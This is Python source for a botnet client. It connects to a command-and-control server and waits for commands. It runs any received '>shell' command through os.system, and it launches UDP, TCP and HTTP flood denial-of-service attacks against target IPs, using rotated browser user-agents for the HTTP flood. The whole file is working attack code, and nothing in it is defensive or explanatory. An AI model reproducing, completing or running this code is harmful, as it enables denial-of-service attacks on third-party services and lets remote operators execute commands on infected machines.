import sys
import time
import socket
import random
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "localhost" # IP for the bot to connect to
port = 8888 # Port for the bot to connect to

connected = False

userAgents = []

userAgents.append('Linux / Firefox 29: Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0')
userAgents.append('Linux / Chrome 34: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
userAgents.append('Mac / Firefox 29: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0')
userAgents.append('Mac / Chrome 34: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
userAgents.append('Mac / Safari 7: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14')
userAgents.append('Windows / Firefox 29: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0')
userAgents.append('Windows / Chrome 34: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36')
userAgents.append('Windows / IE 6: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
userAgents.append('Windows / IE 7: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)')
userAgents.append('Windows / IE 8: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)')
userAgents.append('Windows / IE 9: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)')
userAgents.append('Windows / IE 10: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)')
userAgents.append('Windows / IE 11: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
userAgents.append('Android / Firefox 29: Mozilla/5.0 (Android; Mobile; rv:29.0) Gecko/29.0 Firefox/29.0')
userAgents.append('Android / Chrome 34: Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36')
userAgents.append('iOS / Chrome 34: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) CriOS/34.0.1847.18 Mobile/11B554a Safari/9537.53')
userAgents.append('iOS / Safari 7: Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53')

header = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language: en-us,en;q=0.5","Accept-Encoding: gzip,deflate","Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7","Keep-Alive: 115","Connection: keep-alive"]

headers = ' \n'.join(header)

def system():
	global sock
	global connected

	while not connected:
		try:
			sock.connect((host, port))
			connected = True
		except:
			pass

	print("Connected")

	while connected is True:
		try:
			def commands():
				msg = sock.recv(1024)
				if ">killbots" in msg.lower():
					sys.exit()

				if ">shell" in msg.lower():
					try:
						shell = msg.split(" ")[1]
						os.system(shell)
					except:
						pass

				if ">udp" in msg.lower():
					def udpflood():
						import socket
						try:
							ip = msg.split(" ")[1]
							psize = int(msg.split(" ")[2])
							timer = int(float(msg.split(" ")[3]))

							timeout = time.time() + 1 * timer

							package = random._urandom(psize)

							udpflood = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 17)

							print("Command Accepted!")
							print("UDP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

							while True:
								port = random.randint(1, 65535)
								udpflood.sendto(package, (ip, port))
								if time.time() > timeout:
									return
						except:
							pass
					udpflood()

				if ">tcp" in msg.lower():
					def tcpflood():
						import socket
						try:
							ip = msg.split(" ")[1]
							psize = int(msg.split(" ")[2])
							timer = int(float(msg.split(" ")[3]))

							timeout = time.time() + 1 * timer

							package = random._urandom(psize)

							print("Command Accepted!")
							print("TCP: Sent to %s with %s packets of data for %s seconds!" % (ip, psize, timer))

							while True:
								tcpflood = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
								tcpflood.connect((ip, 80))
								port = random.randint(1, 65535)
								tcpflood.sendto(package, (ip, port))
								tcpflood.close()
								if time.time() > timeout:
									return
						except:
							pass
					tcpflood()

				if ">http" in msg.lower():
					def httpflood():
						try:
							def httpflooder():
								sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
								resolvedHost = socket.gethostbyname(ip)

								query = str("GET / HTTP/1.1\nHost: "+resolvedHost+"\n\nUser-Agent: "+random.choice(userAgents)+"\n"+headers).encode('utf-8')
								sock.connect((resolvedHost, 80))
								sock.sendall(query)
								sock.close()

							ip = msg.split(" ")[1]
							threads = int(msg.split(" ")[2])
							timer = int(float(msg.split(" ")[3]))

							timeout = time.time() + 1 * timer

							print("Command Accepted!")
							print("HTTP: Sent to %s with %s threads for %s seconds!" % (ip, threads, timer))

							while True:
								for x in range(threads):
									thread = threading.Thread(target=httpflooder)
									thread.Deamon = True
									thread.start()
									thread.join()
									if time.time() > timeout:
										return
						except:
							pass
					httpflood()
			commands()
			threads = []
			for i in range(1):
			    thread = threading.Thread(target=commands)
			    threads.append(thread)
			    thread.setDaemon(True)
			    thread.start()
		except socket.error:
			connected = False
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			print("Disconnected")
			while not connected:
				try:
					sock.connect((host, port))
					connected = True
					print("Reconnected")
				except socket.error:
					pass
	sock.close()
system()
